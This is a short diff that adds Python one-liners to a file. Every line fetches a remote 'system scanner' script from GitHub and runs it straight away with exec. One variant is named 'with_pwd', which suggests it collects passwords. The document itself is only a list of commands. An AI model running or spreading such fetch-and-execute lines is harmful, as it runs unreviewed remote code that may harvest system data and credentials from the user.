@@ -1,2 +1,7 @@
 python -c "import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/Sabari425/system_scanner/main/sys_d_v14.py').read())"
 python -c "import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/Sabari425/system_scanner/main/sys_d_v17.py').read())"
+
+python -c "import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/Sabari425/system_scanner_with_pwd/main/sys_d_v14.py').read())"
+python -c "import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/Sabari425/system_scanner_with_pwd/main/sys_d_v17.py').read())"
+
+python -c "import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/Sabari425/deep_ssc/main/deep_sys_d_v3.py').read())"
